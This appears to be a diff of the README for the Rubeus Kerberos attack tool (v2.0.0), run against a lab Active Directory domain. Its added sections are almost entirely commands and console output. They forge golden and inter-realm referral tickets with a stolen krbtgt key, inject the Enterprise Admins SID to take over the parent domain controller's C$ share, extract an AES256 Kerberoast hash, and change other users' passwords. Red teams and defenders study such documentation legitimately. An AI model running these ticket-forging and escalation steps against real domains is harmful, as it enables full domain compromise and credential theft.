+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGS
+
+    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=exploitph)'
+    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+    [*] Attempting to mount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully mounted
+    [*] Attempting to unmount: \\pdc1.rubeus.ghostpack.local\SYSVOL
+    [*] \\pdc1.rubeus.ghostpack.local\SYSVOL successfully unmounted
+    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local
+    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'
+    [*] Building PAC
+
+    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)
+    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039
+    [*] UserId         : 1104
+    [*] Groups         : 513
+    [*] ServiceKey     : 856A1023055848748E7B9D505EBE0E02
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+    [*] KDCKey         : 856A1023055848748E7B9D505EBE0E02
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+    [*] Service        : krbtgt
+    [*] Target         : dev.rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'exploitph@rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 02:45:54
+    [*] StartTime      : 29/07/2021 02:45:54
+    [*] EndTime        : 29/07/2021 12:45:54
+    [*] RenewTill      : 05/08/2021 02:45:54
+
+    [*] base64(ticket.kirbi):
+
+          doIFojCCBZ6gAwIBBaEDAgEWooIEfjCCBHphggR2MIIEcqADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+          LmxvY2Fs
+
+This ticket can then be used to request service tickets on the trusting domain using `asktgs`:
+
+    C:\Rubeus>Rubeus.exe asktgs /service:cifs/devdc1.dev.rubeus.ghostpack.local /dc:devdc1.dev.rubeus.ghostpack.local /ticket:doIFojCCBZ6gAwIBBa...(snip)...NrLmxvY2Fs
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: devdc1.dev.rubeus.ghostpack.local (192.168.71.85)
+    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+    [*] Building TGS-REQ request for: 'cifs/devdc1.dev.rubeus.ghostpack.local'
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFrzCCBaugAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoRwbGkRFVi5SVUJFVVMuR0hPU1RQ
+                                            ...(snip)...
+          ZXVzLmdob3N0cGFjay5sb2NhbA==
+
+      ServiceName              :  cifs/devdc1.dev.rubeus.ghostpack.local
+      ServiceRealm             :  DEV.RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  exploitph
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  29/07/2021 02:51:05
+      EndTime                  :  29/07/2021 12:45:54
+      RenewTill                :  05/08/2021 02:45:54
+      Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+      KeyType                  :  aes256_cts_hmac_sha1
+      Base64(key)              :  v1Bnp3plKCePeRpg1hrtYkI7bPDk6vw5uoj5MBNSThw=
+
+Forge a referral TGT for **dev.ccob@dev.rubeus.ghostpack.local** for the parent domain **rubeus.ghostpack.local** and include the SID of the Enterprise Admins group:
+
+    C:\Rubeus>Rubeus.exe silver /user:dev.ccob /ldap /service:krbtgt/rubeus.ghostpack.local /rc4:856a1023055848748e7b9d505ebe0e02 /sids:S-1-5-21-3237111427-1607930709-3979055039-519 /nowrap
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+    [*] Action: Build TGS
+
+    [*] Trying to query LDAP using LDAPS for user information on domain controller DevDC1.dev.rubeus.ghostpack.local
+    [*] Searching path 'DC=dev,DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=dev.ccob)'
+    [*] Retrieving domain policy information over LDAP from domain controller DevDC1.dev.rubeus.ghostpack.local
+    [*] Searching path 'DC=dev,DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-2065789546-4129202522-221898516-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+    [*] Attempting to mount: \\devdc1.dev.rubeus.ghostpack.local\SYSVOL
+    [*] \\devdc1.dev.rubeus.ghostpack.local\SYSVOL successfully mounted
+    [*] Attempting to unmount: \\devdc1.dev.rubeus.ghostpack.local\SYSVOL
+    [*] \\devdc1.dev.rubeus.ghostpack.local\SYSVOL successfully unmounted
+    [*] Retrieving netbios name information over LDAP from domain controller DevDC1.dev.rubeus.ghostpack.local
+    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=dev.rubeus.ghostpack.local))'
+    [*] Building PAC
+
+    [*] Domain         : DEV.RUBEUS.GHOSTPACK.LOCAL (DEV)
+    [*] SID            : S-1-5-21-2065789546-4129202522-221898516
+    [*] UserId         : 1107
+    [*] Groups         : 513
+    [*] ExtraSIDs      : S-1-5-21-3237111427-1607930709-3979055039-519
+    [*] ServiceKey     : 856A1023055848748E7B9D505EBE0E02
+    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+    [*] KDCKey         : 856A1023055848748E7B9D505EBE0E02
+    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+    [*] Service        : krbtgt
+    [*] Target         : rubeus.ghostpack.local
+
+    [*] Generating EncTicketPart
+    [*] Signing PAC
+    [*] Encrypting EncTicketPart
+    [*] Generating Ticket
+    [*] Generated KERB-CRED
+    [*] Forged a TGT for 'dev.ccob@dev.rubeus.ghostpack.local'
+
+    [*] AuthTime       : 29/07/2021 03:03:34
+    [*] StartTime      : 29/07/2021 03:03:34
+    [*] EndTime        : 29/07/2021 13:03:34
+    [*] RenewTill      : 05/08/2021 03:03:34
+
+    [*] base64(ticket.kirbi):
+
+          doIF0TCCBc2gAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoRwbGkRFVi5SVUJFVVMuR0hPU1RQ
+                                            ...(snip)...
+          G9zdHBhY2subG9jYWw=
+
+This referral TGT can then be used to request service tickets for services in **rubeus.ghostpack.local** using the [asktgs](#asktgs) command and gain the privileges of the Enterprise Admins group:
+
+    C:\Rubeus>Rubeus.exe asktgs /service:cifs/pdc1.rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /ptt /ticket:doIF0TCCBc2gAwIBBaE...(snip)...cy5naG9zdHBhY2subG9jYWw=
+
+      ______        _
+     (_____ \      | |
+      _____) )_   _| |__  _____ _   _  ___
+     |  __  /| | | |  _ \| ___ | | | |/___)
+     | |  \ \| |_| | |_) ) ____| |_| |___ |
+     |_|   |_|____/|____/|_____)____/(___/
+
+     v2.0.0
+
+   [*] Action: Ask TGS
+
+   [*] Using domain controller: pdc1.rubeus.ghostpack.local (192.168.71.80)
+   [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+   [*] Building TGS-REQ request for: 'cifs/pdc1.rubeus.ghostpack.local'
+   [+] TGS request successful!
+   [+] Ticket successfully imported!
+   [*] base64(ticket.kirbi):
+
+         doIF9zCCBfOgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su
+                                            ...(snip)...
+         ZnMbG3BkYzEucnViZXVzLmdob3N0cGFjay5sb2NhbA==
+
+     ServiceName              :  cifs/pdc1.rubeus.ghostpack.local
+     ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+     UserName                 :  dev.ccob
+     UserRealm                :  DEV.RUBEUS.GHOSTPACK.LOCAL
+     StartTime                :  29/07/2021 03:04:26
+     EndTime                  :  29/07/2021 13:03:34
+     RenewTill                :  05/08/2021 03:03:34
+     Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+     KeyType                  :  aes256_cts_hmac_sha1
+     Base64(key)              :  lQGdcWT5/cacHGFko3fDJvF9poFK+tH5hctlDN89peY=
+
+
+
+   C:\Rubeus>dir \\pdc1.rubeus.ghostpack.local\c$
+    Volume in drive \\pdc1.rubeus.ghostpack.local\c$ has no label.
+    Volume Serial Number is 3C5F-0EF1
+
+    Directory of \\pdc1.rubeus.ghostpack.local\c$
+
+   30/06/2021  02:13    <DIR>          inetpub
+   15/09/2018  08:19    <DIR>          PerfLogs
+   09/06/2021  17:45    <DIR>          Program Files
+   09/06/2021  17:45    <DIR>          Program Files (x86)
+   14/07/2021  01:18    <DIR>          Rubeus
+   19/07/2021  20:48    <DIR>          temp
+   30/06/2021  02:14    <DIR>          Users
+   14/07/2021  02:17    <DIR>          Windows
+                  0 File(s)              0 bytes
+                  8 Dir(s)  94,901,772,288 bytes free
+
+
+
 ## Ticket Management
 
 Breakdown of the ticket management commands:
@@ -1147,6 +2091,10 @@ The **describe** action takes a `/ticket:X` value (TGT or service ticket), parse
 
 If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.
 
+The EncTicketPart (encrypted section of the ticket) can be decrypted using the `/servicekey:X` argument, this will also verify the ServerChecksum within the PAC. The `/krbkey:X` argument can also be used for service tickets to verify the KDCChecksum and TicketChecksum (if it exists).
+
+By passing the `/serviceuser:X` argument (and `/servicedomain:X` is required), an crackable "hash" can be formed from an AES256 encrypted ticket service ticket.
+
 Display information about a TGT:
 
     C:\Rubeus>Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
@@ -1174,7 +2122,7 @@ Display information about a TGT:
     KeyType               :  rc4_hmac
     Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==
 
-Display information about service ticket with an extracted Kerberoast hash:
+Display information about service ticket with an extracted Kerberoast "hash":
 
     C:\Rubeus>Rubeus.exe describe /ticket:service_ticket.kirbi
 
@@ -1201,6 +2149,130 @@ Display information about service ticket with an extracted Kerberoast hash:
     KeyType               :  rc4_hmac
     Base64(key)           :  WqGWK4htp7rM1CURpxjMPA==
     Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...
+
+Display information about a TGT along with the decrypted PAC:
+
+    C:\Rubeus>Rubeus.exe describe /servicekey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ticket:doIFaDCCBWSgAw...(snip)...HBhY2subG9jYWw=
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+
+    [*] Action: Describe Ticket
+
+
+      ServiceName              :  krbtgt/rubeus.ghostpack.local
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  exploitph
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  28/07/2021 21:25:45
+      EndTime                  :  29/07/2021 07:25:45
+      RenewTill                :  04/08/2021 21:25:45
+      Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+      KeyType                  :  rc4_hmac
+      Base64(key)              :  Gcf0pE1AVgbbmtSRqJbf9A==
+      Decrypted PAC            :
+        LogonInfo              :
+          LogonTime            : 20/07/2021 22:10:22
+          LogoffTime           :
+          KickOffTime          :
+          PasswordLastSet      : 14/07/2021 00:50:44
+          PasswordCanChange    : 15/07/2021 00:50:44
+          PasswordMustChange   :
+          EffectiveName        : exploitph
+          FullName             : Exploit PH
+          LogonScript          :
+          ProfilePath          :
+          HomeDirectory        :
+          HomeDirectoryDrive   :
+          LogonCount           : 11
+          BadPasswordCount     : 0
+          UserId               : 1104
+          PrimaryGroupId       : 513
+          GroupCount           : 1
+          Groups               : 513
+          UserFlags            : (32) EXTRA_SIDS
+          UserSessionKey       : 0000000000000000
+          LogonServer          : PDC1
+          LogonDomainName      : RUBEUS
+          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039
+          UserAccountControl   : (262672) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+          ExtraSIDCount        : 1
+          ExtraSIDs            : S-1-18-1
+          ResourceGroupCount   : 0
+        ClientName             :
+          Client Id            : 28/07/2021 21:25:45
+          Client Name          : exploitph
+        UpnDns                 :
+          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL
+          UPN                  : exploitph@rubeus.ghostpack.local
+          Flags                : 0
+        ServerChecksum         :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : DC220C13C97C5723456DADE2 (VALID)
+        KDCChecksum            :
+          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+          Signature            : 32C03715F0B11E3D2EDA3D05 (VALID)
+
+Displaying information about an AES256 encrypted service ticket with an extracted Kerberoast "hash":
+
+    C:\Rubeus>Rubeus.exe describe /serviceuser:exploitph /ticket:doIFSjCCB...(snip)...Vyb2FzdBsCbWU=
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.0.0
+
+
+    [*] Action: Describe Ticket
+
+
+      ServiceName              :  roast/me
+      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL
+      UserName                 :  harmj0y
+      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL
+      StartTime                :  28/07/2021 21:31:57
+      EndTime                  :  29/07/2021 07:31:20
+      RenewTill                :  04/08/2021 21:31:20
+      Flags                    :  name_canonicalize, pre_authent, renewable
+      KeyType                  :  aes256_cts_hmac_sha1
+      Base64(key)              :  T+hpOdnnvvLhnSwup/O/DmYYY3CXVP4kN/Hq5qWWwKg=
+      Kerberoast Hash       :  $krb5tgs$18$exploitph$RUBEUS.GHOSTPACK.LOCAL$*roast/me*$1063B9C2E8BAB76E5051F5DE
+                               $CD5F3403552BD882CBC52389C9851EFD9B7B72174CCA44876DD4E2958FE807B2A899EE33279835D
+                               01BEF12B6FE65174B4BF7B6A5062F45DDBEDA76CF2B122579194B3F1CF3192F982EFE5109B4FF644
+                               FDE4D4A170551B764A699DC4DB3535AE937E24D8D5EF0C980C98D115A6707A1F2583FAAB76FD4514
+                               6957453FAAD213EF28ACED98E72CC909FCC8CB0FD904DE71607BB1C25163EC9512996057CB34950F
+                               40480CABC5CA812B06E461FF3ECAE62022D7BA3500B506AF9BCD557DB987D565FEC8583E5C093AB5
+                               AF7387930AE3DBC0C4197DB75988D0785E90B1C799C1245CBC891BEC5008BFED99A8042214300440
+                               4846C3296A721B546428CA71640B2BDD730ADEDBE6217C572288D904E5F64843148EF30BED8F62A7
+                               A038B770DDD787BBBDCCBC4BF63EAC4C18E596F9A1C21B3265C1D402E84547B5491E4FE8E9B05E10
+                               606773DA47C2570B7B191AE2648C0C467ED242F86C2DC5BD90D5E07D5C3DAACC917E796E5ACB416B
+                               8D980AC30D300016556AEF064DC6C0822D6EAEF41EC5C376E46BE54AB6B85959BDEDF0D15F87AD07
+                               14F8999503F6DEEDC5F1798D7F82FB4A068D1C44A761C44589EAF7E17D4C855893A8C71B2FE309EB
+                               2FE87D36429CF0CA9AA3B02C981F2E6900D0B887EBF1438B3D084963D5AD6B06894A49D3BFED4A19
+                               5CA0A544A6E73B46E85C0B5E6F7230884E44B265A48CB5EFF3EC699B63DF4C5241FC11F2E74953CF
+                               DD610C9B3137CD15C716E538F42464A37D2B5F719B6FD0D783509B503E68F46F1FE0E03D12B97B79
+                               6EFB104E093F625894C59BC025273CF0F0B1EF975FF9584AEE227E27304DE545C71B367BEF2EF6DA
+                               22CFF2940387DEA77446B84AC436C7FD273C04247D67334A8D2F2729DE88287BB270D0F495F8EA50
+                               126EA94E7417A4191D080A7284FF2736C704A03EF7F7A044A6E357972A7BAC56AD3775C110A10954
+                               0656CB6759BB61B47B7FF5545A97735279CDB281F632DAD91047FBEC3E98F8B5BC10CA4FFE446186
+                               67BC174CFE97E2262EE8E4651AB460AB2E9A1B214566969FE30BC9A2EEA2BBC79E1ABDBB5A6E8BB6
+                               0EF60EB33DCA0F50682DAB8A2F4AE863F83AD928E8D977AA2079706827B78A0CF37FA2D62EAD3A14
+                               70625022335458E0E84C11786E9A84CAB5A136777B9E8293142D62D96DF9E04AACE6839E13CC54CA
+                               B2B7F5752F8CE9544D7076960CCD7D26C8A0E8E9C879A11A44D2BCC607CE15862E29361C786C095C
+                               1EA55D7BD277E581E2488BD3FA4B8E09C331A1E7E3C4BE1C745B59E710362F8EEE9578EF9E5FB34F
+                               AAA63C3D7D85000A84A29831B01BD0F4239263FDF59621E57CEE718B29AA2561857C4CD8020AF057
+                               AB5AC097DA90E9B15F6C881F47D95A9F9C15B60EE0B821FDDEB3A9AD4D71E
 
 
 ## Ticket Extraction and Harvesting
@@ -1792,6 +2864,8 @@ If the `/enterprise` flag is used, the spn is assumed to be an enterprise princi
 
 If the `/autoenterprise` flag is used, if roasting an SPN fails (due to an invalid or duplicate SPN) Rubeus will automatically retry using the enterprise principal. This is only useful when `/spn` or `/spns` is *not* supplied as Rubeus needs to know the target accounts samaccountname, which it gets when querying LDAP for the account information.
 
+If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
+
 
 #### kerberoasting opsec
 
@@ -2069,6 +3143,8 @@ Also, if you wanted to use alternate domain credentials for kerberoasting, that 
 
 The output `/format:X` defaults to John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)). `/format:hashcat` is also an option for the new hashcat mode 18200.
 
+If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
+
 AS-REP roasting all users in the current domain:
 
     C:\Rubeus>Rubeus.exe asreproast
@@ -2317,6 +3393,8 @@ Create a visible command prompt:
 
 The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified `/new:PASSWORD` value. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's **misc::changepw** function.
 
+The `/targetuser` argument can be used to change the password of other users, given the user whose TGT it is has enough privileges.
+
 You can retrieve a TGT blob using the [asktgt](#asktgt) command.
 
     C:\Rubeus>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
@@ -2342,6 +3420,7 @@ You can retrieve a TGT blob using the [asktgt](#asktgt) command.
     [*] Sent 1347 bytes
     [*] Received 167 bytes
     [+] Password change success!
+
 
 ### hash
 
